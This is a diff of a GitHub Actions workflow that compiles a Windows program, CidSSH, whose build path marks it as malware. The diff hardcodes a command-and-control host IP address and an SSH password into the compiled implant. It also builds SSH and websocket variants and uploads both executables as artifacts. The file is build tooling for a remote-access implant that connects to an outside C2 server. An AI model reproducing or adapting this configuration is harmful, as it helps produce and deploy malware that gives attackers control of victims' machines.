@@ -6,10 +6,11 @@ on:
       types: # This configuration does not affect the page_build event above
         - created
 
-# Hardcode C2_IP and C2 SSH password so the CI builds everything for you
+# Hardcode C2_HOST and C2 SSH password so the CI builds everything for you (keep quotes)
 env:
-  C2_IP: ""
-  PASSWORD_AUTH: ""
+  CID_C2_HOST: "104.155.189.242"
+  CID_C2_USER: ""
+  CID_C2_PASSWORD: "testtest"
 
 jobs:
     build:
@@ -17,39 +18,54 @@ jobs:
         runs-on: windows-2019
         steps:
             - uses: haya14busa/action-cond@v1
-              id: c2IPCondval
+              id: CidC2HostCondval
               with:
-                cond: "${{ env.C2_IP == '' }}"
+                cond: "${{ env.CID_C2_HOST == '' }}"
                 if_true: ""
-                if_false: "-DC2_IP=${{ env.C2_IP }}"
+                if_false: "-DCID_C2_HOST=\"${{ env.CID_C2_HOST }}\""
 
             - uses: haya14busa/action-cond@v1
-              id: passwordCondval
+              id: CidUserCondval
               with:
-                cond: "${{ env.PASSWORD_AUTH == '' }}"
+                cond: "${{ env.CID_C2_USER == '' }}"
                 if_true: ""
-                if_false: "-DPASSWORD_AUTH=${{ env.PASSWORD_AUTH }}"
+                if_false: "-DCID_C2_USER=\"${{ env.CID_C2_USER }}\""
+
+            - uses: haya14busa/action-cond@v1
+              id: CidPasswordCondval
+              with:
+                cond: "${{ env.CID_C2_PASSWORD == '' }}"
+                if_true: ""
+                if_false: "-DCID_C2_PASSWORD=\"${{ env.CID_C2_PASSWORD }}\""
 
             - uses: actions/checkout@v1
               with:
                   submodules: true
                     
-            - name: Update vcpkg triplet to only build release
+            - name: Update vcpkg and the triplet to only build release
               run: |
+                  cd $env:VCPKG_INSTALLATION_ROOT
+                  git reset --hard
+                  git pull
+                  ".\bootstrap-vcpkg.bat"
                   "`r`nset(VCPKG_BUILD_TYPE release)" | Add-Content "$env:VCPKG_INSTALLATION_ROOT\triplets\x64-windows-static.cmake"
                   
             - name: Install libssh and Boost with vcpkg
               run: |
                   vcpkg install --triplet x64-windows-static boost-beast boost-asio boost-system libssh[core,openssl]
+            
             - name: Create ssh version
               run: |
-                  cmake -S . -B build -DWITH_WEBSOCKETS=OFF ${{ steps.c2IPCondval.outputs.value }} ${{ steps.passwordCondval.outputs.value }} -G "Visual Studio 16 2019" -A x64 -DVCPKG_TARGET_TRIPLET="x64-windows-static" -DCMAKE_TOOLCHAIN_FILE="$env:VCPKG_INSTALLATION_ROOT\scripts\buildsystems\vcpkg.cmake" -DCMAKE_BUILD_TYPE=Release
+                  cmake -S . -B build -DWITH_WEBSOCKETS=OFF ${{ steps.CidC2HostCondval.outputs.value }} ${{ steps.CidUserCondval.outputs.value }} ${{ steps.CidPasswordCondval.outputs.value }} -G "Visual Studio 16 2019" -A x64 -DVCPKG_TARGET_TRIPLET="x64-windows-static" -DCMAKE_TOOLCHAIN_FILE="$env:VCPKG_INSTALLATION_ROOT\scripts\buildsystems\vcpkg.cmake" -DCMAKE_BUILD_TYPE=Release
+            
             - name: Build CidSSH in Release mode
               run: |
                   cmake --build build --config Release
+            
             - name: Create ws version
               run: |
                   cmake -S . -B build_ws -DWITH_WEBSOCKETS=ON -G "Visual Studio 16 2019" -A x64 -DVCPKG_TARGET_TRIPLET="x64-windows-static" -DCMAKE_TOOLCHAIN_FILE="$env:VCPKG_INSTALLATION_ROOT\scripts\buildsystems\vcpkg.cmake" -DCMAKE_BUILD_TYPE=Release
+            
             - name: Build CidSSH in Release mode
               run: |
                   cmake --build build_ws --config Release
@@ -58,6 +74,7 @@ jobs:
               with:
                   name: CidSSH_win_ssh_x64.exe
                   path: build/src/malware/Release/CidSSH.exe                 
+            
             - uses: actions/upload-artifact@master
               with:
                   name: CidSSH_win_ws_x64.exe
